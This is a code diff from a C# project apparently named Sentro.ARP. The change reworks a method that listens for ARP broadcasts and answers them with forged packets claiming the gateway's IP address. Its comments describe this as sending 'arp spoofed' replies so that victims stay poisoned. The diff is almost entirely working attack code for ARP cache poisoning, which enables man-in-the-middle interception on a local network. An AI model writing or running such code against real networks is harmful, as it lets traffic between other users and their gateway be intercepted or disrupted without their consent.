@@ -233,42 +233,48 @@ namespace Sentro.ARP
             so this will instantly send arp spoofed replay insted of the timed attack
             and hopefully target is not lost for long time
         */
+
         private void FightBackAnnoyingBroadcasts(LivePacketDevice nic)
-        {            
+        {
             var ether = new EthernetLayer
             {
                 Source = new MacAddress(_myMac),
                 Destination = new MacAddress("FF:FF:FF:FF:FF:FF"),
                 EtherType = EthernetType.None
             };
-            
 
-            PacketCommunicator communicator = nic.Open(500, PacketDeviceOpenAttributes.None, 50);
-            communicator.SetFilter("arp && ether dst ff:ff:ff:ff:ff:ff");
-
-            communicator.ReceivePackets(0, arp =>
+            Task.Run(() =>
             {
-                var sourceIp = arp.Ethernet.IpV4.Source.ToString();
-                if (sourceIp.Equals(_gatewayIp))
+                PacketCommunicator communicator = nic.Open(500, PacketDeviceOpenAttributes.None, 50);
+                communicator.SetFilter("arp && ether dst ff:ff:ff:ff:ff:ff");
+
+                while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                 {
-                    var arplayer = new ArpLayer
+                    communicator.ReceivePackets(0, arp =>
                     {
-                        ProtocolType = EthernetType.IpV4,
-                        Operation = ArpOperation.Request,
-                        SenderHardwareAddress = ether.Source.ToBytes(),
-                        SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
-                        TargetHardwareAddress = MacAddress.Zero.ToBytes(),
-                        TargetProtocolAddress = arp.Ethernet.IpV4.Destination.ToBytes()
-                    };
-                    var packet = new PacketBuilder(ether, arplayer).Build(DateTime.Now);
-                    communicator.SendPacket(packet);
+                        var sourceIp = arp.Ethernet.IpV4.Source.ToString();
+                        if (sourceIp.Equals(_gatewayIp))
+                        {
+                            var arplayer = new ArpLayer
+                            {
+                                ProtocolType = EthernetType.IpV4,
+                                Operation = ArpOperation.Request,
+                                SenderHardwareAddress = ether.Source.ToBytes(),
+                                SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
+                                TargetHardwareAddress = MacAddress.Zero.ToBytes(),
+                                TargetProtocolAddress = arp.Ethernet.IpV4.Destination.ToBytes()
+                            };
+                            var packet = new PacketBuilder(ether, arplayer).Build(DateTime.Now);
+                            communicator.SendPacket(packet);
+                        }
+                        else if (KvStore.IpMac.ContainsKey(sourceIp))
+                        {
+                            SpoofGateway(communicator, sourceIp);
+                        }
+                    });
                 }
-                else if (KvStore.IpMac.ContainsKey(sourceIp))
-                {
-                    SpoofGateway(communicator, sourceIp);
-                }
-            });            
-            communicator.Dispose();
+                communicator.Dispose();
+            });
         }
 
         /*
